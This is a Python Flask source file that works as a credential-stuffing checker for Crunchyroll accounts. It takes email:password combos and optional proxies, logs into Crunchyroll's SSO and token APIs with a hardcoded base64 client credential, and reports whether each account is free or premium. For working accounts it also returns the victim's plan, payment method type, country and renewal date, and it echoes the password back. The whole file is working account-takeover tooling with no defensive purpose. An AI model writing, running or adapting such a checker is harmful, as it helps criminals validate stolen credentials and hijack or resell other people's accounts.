from flask import Flask, jsonify, request
import requests
from datetime import datetime
import pytz
import base64
import random

app = Flask(__name__)

loda = "bm9haWhkZXZtXzZpeWcwYThsMHE6"

def get_proxy_dict(proxy_string):    
    try:                
        if ':' in proxy_string and len(proxy_string.split(':')) == 4:
            parts = proxy_string.split(':')
            ip, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{ip}:{port}"
            return {
                'http': proxy_url,
                'https': proxy_url
            }                
        else:
            parts = proxy_string.split()
            if len(parts) == 4:
                host, port, user, password = parts
                proxy_url = f"http://{user}:{password}@{host}:{port}"
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }            
            else:
                return None
    except:
        return None

def check_crunchyroll_with_proxy(email, password, proxy_dict=None):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    session = requests.Session()
    if proxy_dict:
        session.proxies.update(proxy_dict)
    
    try:        
        r = session.get("https://www.crunchyroll.com/", headers=headers, timeout=30)
        if r.status_code != 200:
            return {"status": "error", "message": "⛔ Failed to reach Crunchyroll"}

        # Login headers and data
        login_headers = {
            "Host": "sso.crunchyroll.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
            "Accept": "*/*",
            "Referer": "https://sso.crunchyroll.com/login",
            "Origin": "https://sso.crunchyroll.com",
            "Content-Type": "application/json",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }

        login_json = {
            "email": email,
            "password": password,
            "eventSettings": {}
        }

        # Attempt login
        login_res = session.post(
            "https://sso.crunchyroll.com/api/login",
            json=login_json,
            headers=login_headers,
            timeout=30
        )

        if "invalid_credentials" in login_res.text or login_res.status_code != 200:
            return {"status": "❌ invalid", "email": email, "password": password}

        # Get device ID from cookies
        device_id = login_res.cookies.get("device_id")
        if not device_id:
            return {"status": "error", "message": "⛔ Failed to get device id"}

        # Get access token
        token_headers = {
            "Host": "www.crunchyroll.com",
            "User-Agent": login_headers["User-Agent"],
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"Basic {loda}",
            "Origin": "https://www.crunchyroll.com",
            "Referer": "https://www.crunchyroll.com/"
        }

        token_data = {
            "device_id": device_id,
            "device_type": "Firefox on Windows",
            "grant_type": "etp_rt_cookie"
        }

        token_res = session.post(
            "https://www.crunchyroll.com/auth/v1/token",
            data=token_data,
            headers=token_headers,
            timeout=30
        )

        if token_res.status_code != 200:
            return {"status": "error", "message": "⛔ Failed to get token"}

        js = token_res.json()
        token = js.get("access_token")
        account_id = js.get("account_id")

        # Get subscription info
        subs_res = session.get(
            f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
            headers={
                "Host": "www.crunchyroll.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/136.0",
                "Accept": "application/json, text/plain, */*",
                "Authorization": f"Bearer {token}",
                "Referer": "https://www.crunchyroll.com/account/membership"
            },
            timeout=30
        )

        if subs_res.status_code != 200:
            return {"status": "error", "message": "⛔ Failed to fetch subscription"}

        data = subs_res.json()
        
        # Handle free accounts
        if data.get("containerType") == "free":
            return {
                "status": "free",
                "email": email,
                "password": password,
                "plan": "✅ FREE"
            }

        # Parse subscription details
        subscriptions = data.get("subscriptions", [])
        if subscriptions:
            plan = subscriptions[0].get("plan", {})
            tier = plan.get("tier", {})
            plan_text = tier.get("text") or plan.get("name", {}).get("text") or plan.get("name", {}).get("value") or "None"
            plan_value = tier.get("value") or plan.get("name", {}).get("value") or "None"
            active_free_trial = str(subscriptions[0].get("activeFreeTrial", False))
            next_renewal_date = subscriptions[0].get("nextRenewalDate", "None")
            status = subscriptions[0].get("status", "None")
        else:
            plan_text = "None"
            plan_value = "None"
            active_free_trial = "False"
            next_renewal_date = "N/A"
            status = "none"

        # Payment information
        payment = data.get("currentPaymentMethod", {})
        payment_info = payment.get("name", "None") if payment else "None"
        payment_method_type = payment.get("paymentMethodType", "None") if payment else "None"
        country_code = payment.get("countryCode", "None") if payment else "None"

        # Format renewal date
        if next_renewal_date not in ["N/A", "None"]:
            renewal_dt = datetime.strptime(next_renewal_date, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
            formatted_renewal_date = renewal_dt.strftime("%d-%m-%Y")
            ist = pytz.timezone("Asia/Kolkata")
            current_dt = datetime.now(ist)
            days_left = (renewal_dt.astimezone(ist) - current_dt).days
            if days_left < 0:
                days_left = 0
        else:
            formatted_renewal_date = next_renewal_date
            days_left = "N/A"

        # Return premium account details
        plan_info = f"{plan_text}—{plan_value}"
        return {
            "status": "premium",
            "email": email,
            "password": password,
            "country": country_code,
            "plan": plan_info,
            "payment_method": payment_info,
            "payment_type": payment_method_type,
            "trial": active_free_trial,
            "subscription_status": status,
            "renewal_date": formatted_renewal_date,
            "days_left": days_left
        }

    except requests.RequestException as e:
        return {"status": "error", "message": f"Network Error: {str(e)}"}
    except Exception as e:
        return {"status": "error", "message": f"Unexpected Error: {str(e)}"}
    finally:
        session.close()

@app.route('/check', methods=['GET'])
def check_account():
    try:
        email_pass = request.args.get('email')
        proxy = request.args.get('proxy')
        
        if not email_pass:
            return jsonify({"status": "error", "message": "Missing email parameter"}), 400
        
        if ":" not in email_pass:
            return jsonify({"status": "error", "message": "Invalid email format. Use email:pass"}), 400
        
        email, password = email_pass.split(":", 1)
        
        # Check if proxy is provided
        if proxy:
            proxy_dict = get_proxy_dict(proxy)
            if not proxy_dict:
                return jsonify({"status": "error", "message": "Invalid proxy format. Use 'ip:port:user:pass' or 'host:port:user:pass'"}), 400
            result = check_crunchyroll_with_proxy(email, password, proxy_dict)
        else:
            result = check_crunchyroll_with_proxy(email, password)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
